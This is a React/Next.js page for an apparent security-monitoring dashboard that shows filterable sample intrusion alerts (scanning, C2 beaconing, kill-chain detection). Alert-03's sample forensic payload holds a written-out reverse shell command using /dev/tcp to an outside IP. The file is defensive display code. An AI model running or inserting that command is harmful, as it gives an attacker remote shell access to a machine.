"use client";

import React, { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, Filter, Search, Terminal } from "lucide-react";
import { BrutalistHeader } from "@/components/BrutalistHeader";
import { HazardFooter } from "@/components/HazardFooter";
import { LiveAlertFeed, AlertItem } from "@/components/LiveAlertFeed";
import { AttackSimulationModal } from "@/components/AttackSimulationModal";

export default function AlertsPage() {
  const [isSimModalOpen, setIsSimModalOpen] = useState(false);
  const [filterSeverity, setFilterSeverity] = useState("ALL");
  const [searchTerm, setSearchTerm] = useState("");

  const sampleAlerts: AlertItem[] = [
    {
      alert_id: "alert-01",
      timestamp: new Date().toISOString(),
      title: "CRITICAL: Multi-Stage Attack Chain Detected on 192.168.1.100",
      severity: "CRITICAL",
      source_ip: "198.51.100.44",
      destination_ip: "192.168.1.100",
      mitre_technique: "ATTACK-CHAIN-DETECTED",
      attack_chain_stage: "CRITICAL-ROOT",
      description: "Sequential kill-chain stages satisfied within 60s window.",
      forensic_payload: '{"target": "192.168.1.100", "stages": ["RECON", "EXPLOITATION", "EXECUTION", "C2"]}',
    },
    {
      alert_id: "alert-02",
      timestamp: new Date(Date.now() - 15000).toISOString(),
      title: "Covert C2 Beaconing Detected (192.168.1.100 -> 198.51.100.44)",
      severity: "CRITICAL",
      source_ip: "192.168.1.100",
      destination_ip: "198.51.100.44",
      mitre_technique: "T1071.001",
      attack_chain_stage: "C2",
      description: "Periodic beaconing detected with jitter < 0.15.",
      forensic_payload: '{"interval": 1.5, "jitter": 0.04}',
    },
    {
      alert_id: "alert-03",
      timestamp: new Date(Date.now() - 32000).toISOString(),
      title: "Malicious Process Execution: Reverse Shell Spawning via /dev/tcp",
      severity: "HIGH",
      source_ip: "192.168.1.100",
      destination_ip: "198.51.100.44",
      mitre_technique: "T1059.004",
      attack_chain_stage: "EXECUTION",
      description: "Shell spawned with redirected file descriptors.",
      forensic_payload: '{"pid": 9482, "cmd": "/bin/sh -i >& /dev/tcp/198.51.100.44/4444 0>&1"}',
    },
    {
      alert_id: "alert-04",
      timestamp: new Date(Date.now() - 65000).toISOString(),
      title: "Network Service Scanning: Inbound TCP SYN Probe",
      severity: "MEDIUM",
      source_ip: "45.33.32.156",
      destination_ip: "192.168.1.100",
      mitre_technique: "T1046",
      attack_chain_stage: "RECON",
      description: "Probed ports: 21, 22, 80, 443, 8080.",
      forensic_payload: '{"probe_type": "SYN_SCAN", "ports_hit": 5}',
    },
  ];

  const filteredAlerts = sampleAlerts.filter((a) => {
    const matchSev = filterSeverity === "ALL" || a.severity === filterSeverity;
    const matchSearch =
      searchTerm === "" ||
      a.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
      a.source_ip.includes(searchTerm) ||
      a.destination_ip.includes(searchTerm) ||
      a.mitre_technique.toLowerCase().includes(searchTerm.toLowerCase());
    return matchSev && matchSearch;
  });

  return (
    <div className="min-h-screen bg-[#050505] text-gray-100 flex flex-col font-mono selection:bg-acid-lime selection:text-black">
      <BrutalistHeader onOpenSimulation={() => setIsSimModalOpen(true)} />

      <main className="max-w-7xl mx-auto px-4 md:px-8 py-8 w-full space-y-8 flex-1">
        {/* Breadcrumb & Title */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-6 border-b border-cyber-border gap-4">
          <div>
            <div className="flex items-center space-x-2 text-xs text-muted-gray mb-1">
              <Link href="/" className="text-acid-lime hover:underline flex items-center gap-1">
                <ArrowLeft size={12} /> SENTINEL_
              </Link>
              <span>/</span>
              <span>FORENSICS</span>
              <span>/</span>
              <span className="text-white">DATABASE</span>
            </div>
            <h1 className="text-3xl font-display font-black tracking-wider uppercase text-white">
              FORENSIC TELEMETRY TRIAGE
            </h1>
          </div>

          <div className="flex items-center space-x-2 text-xs">
            <span className="text-muted-gray">STORAGE:</span>
            <span className="text-acid-lime font-bold">CLICKHOUSE COLUMNAR</span>
          </div>
        </div>

        {/* Filter Controls */}
        <div className="p-4 bg-[#0a0c10] border border-cyber-border flex flex-col md:flex-row items-center justify-between gap-4 text-xs">
          {/* Severity Pills */}
          <div className="flex flex-wrap items-center gap-2 w-full md:w-auto">
            <span className="text-muted-gray font-semibold flex items-center gap-1 mr-2">
              <Filter size={14} /> SEVERITY:
            </span>
            {["ALL", "CRITICAL", "HIGH", "MEDIUM"].map((sev) => (
              <button
                key={sev}
                onClick={() => setFilterSeverity(sev)}
                className={`px-3 py-1 font-bold transition ${
                  filterSeverity === sev
                    ? "bg-acid-lime text-black"
                    : "bg-[#050505] border border-cyber-border text-muted-gray hover:text-white"
                }`}
              >
                {sev}
              </button>
            ))}
          </div>

          {/* Search Box */}
          <div className="w-full md:w-72 relative">
            <input
              type="text"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              placeholder="SEARCH IP, TECHNIQUE, SIGNATURE..."
              className="w-full bg-[#050505] border border-cyber-border px-3 py-1.5 pl-8 text-xs text-white focus:border-acid-lime outline-none"
            />
            <Search size={14} className="absolute left-2.5 top-2 text-muted-gray" />
          </div>
        </div>

        {/* Live Feed with Filtered Alerts */}
        <div>
          <LiveAlertFeed initialAlerts={filteredAlerts} />
        </div>
      </main>

      <HazardFooter />

      <AttackSimulationModal
        isOpen={isSimModalOpen}
        onClose={() => setIsSimModalOpen(false)}
      />
    </div>
  );
}
